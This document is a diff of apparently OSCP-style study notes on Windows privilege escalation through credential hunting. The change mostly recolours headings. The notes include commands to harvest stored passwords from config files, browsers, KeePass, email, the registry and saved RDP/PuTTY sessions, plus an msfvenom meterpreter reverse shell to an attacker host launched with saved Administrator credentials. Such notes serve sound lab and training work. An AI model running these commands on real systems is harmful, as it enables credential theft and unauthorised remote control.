@@ -1,11 +1,11 @@
 
-# Search Application Config Files for Passwords
+# <span style="color:#FF5555">Search Application Config Files for Passwords</span>
 Many applications store passwords in config files in plain text (bad practice)
 ```powershell
 findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
 ```
 
-# Check Chrome Custom Dictionary for Passwords
+# <span style="color:#FF5555">Check Chrome Custom Dictionary for Passwords</span>
 Users might save passwords or secrets as custom dictionary entries.
 ```powershell
 Get-Content "C:\Users\<username>\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt" | Select-String "password"
@@ -13,7 +13,7 @@ Get-Content "C:\Users\<username>\AppData\Local\Google\Chrome\User Data\Default\C
 - Replace `<username>` with the actual Windows user.
 - This reads the dictionary file and searches for the word "password".
 
-# Cmdkey Saved Credentials
+# <span style="color:#FF5555">Cmdkey Saved Credentials</span>
 Windows stores saved usernames and passwords for things like Remote Desktop connections.
 
 ```bash
@@ -21,7 +21,7 @@ Windows stores saved usernames and passwords for things like Remote Desktop conn
 cmdkey /list
 
 # create a reverse shell
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.17 LPORT=4747 -f exe -o oscpp.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ATTACKER_IP LPORT=4747 -f exe -o oscpp.exe
 
 # run the reverse
 runas /savecred /user:Access\\Administrator C:\\PrivEsc\\oscpp.exe
@@ -31,7 +31,7 @@ runas /user:Access\\Administrator /savecred "cmd /c type C:\\Users\\Administrato
 ```
 ![[Pasted image 20250828064001.png]]
 
-# Browser Credentials (Chrome)
+# <span style="color:#FF5555">Browser Credentials (Chrome)</span>
 Users often save passwords in their browsers.
 
 Extract saved Chrome passwords with SharpChrome:
@@ -42,7 +42,7 @@ Extract saved Chrome passwords with SharpChrome:
 
 This displays usernames and passwords saved in Chrome for the current user.
 
-# Password Managers (KeePass)
+# <span style="color:#FF5555">Password Managers (KeePass)</span>
 Password managers like KeePass store multiple passwords securely but can sometimes be cracked.
 
 Extract KeePass hash from .kdbx file:
@@ -59,7 +59,7 @@ hashcat -m 13400 keepass_hash.txt /path/to/rockyou.txt
 
 If cracked, you get access to many stored passwords for important systems.
 
-### 4. Searching Emails for Passwords
+### <span style="color:#50FA7B">4. Searching Emails for Passwords</span>
 If you have access to a user's email inbox (Microsoft Exchange), you can search for passwords or credentials.
 
 Example command with MailSniper:
@@ -68,7 +68,7 @@ Example command with MailSniper:
 MailSniper -search "password" -search "credential"
 ```
 
-### 5. Extracting Credentials with LaZagne
+### <span style="color:#50FA7B">5. Extracting Credentials with LaZagne</span>
 LaZagne can extract stored passwords from many applications.
 
 View help menu:
@@ -85,7 +85,7 @@ Run all modules to extract any saved credentials:
 
 This attempts to find and display cleartext passwords saved by browsers, chat clients, databases, and more.
 
-### 6. Extract Remote Access Credentials with SessionGopher
+### <span style="color:#50FA7B">6. Extract Remote Access Credentials with SessionGopher</span>
 SessionGopher finds saved login info for remote tools like PuTTY, WinSCP, and RDP.
 
 Import the module in PowerShell:
@@ -102,7 +102,7 @@ Invoke-SessionGopher -Target WINLPE-SRV01
 
 You’ll get decrypted saved session info like usernames and passwords.
 
-### 7. Cleartext Passwords in Registry - Windows AutoLogon
+### <span style="color:#50FA7B">7. Cleartext Passwords in Registry - Windows AutoLogon</span>
 Windows AutoLogon stores username and password in the registry for automatic login.
 
 Check AutoLogon registry keys:
@@ -121,7 +121,7 @@ DefaultPassword (password in cleartext)
 
 Note: Using Autologon.exe from Sysinternals encrypts the password and is safer.
 
-### 8. PuTTY Sessions Stored in Registry
+### <span style="color:#50FA7B">8. PuTTY Sessions Stored in Registry</span>
 PuTTY saves session info including proxy credentials in the registry.
 
 List saved PuTTY sessions:
@@ -138,7 +138,7 @@ reg query "HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions<SESSION_NAME>"
 
 Look for ProxyUsername and ProxyPassword which may be stored in cleartext.
 
-### 9. Wi-Fi Passwords
+### <span style="color:#50FA7B">9. Wi-Fi Passwords</span>
 If you have admin access on a Windows machine with Wi-Fi, you can list saved wireless networks and their passwords.
 
 List saved Wi-Fi profiles:
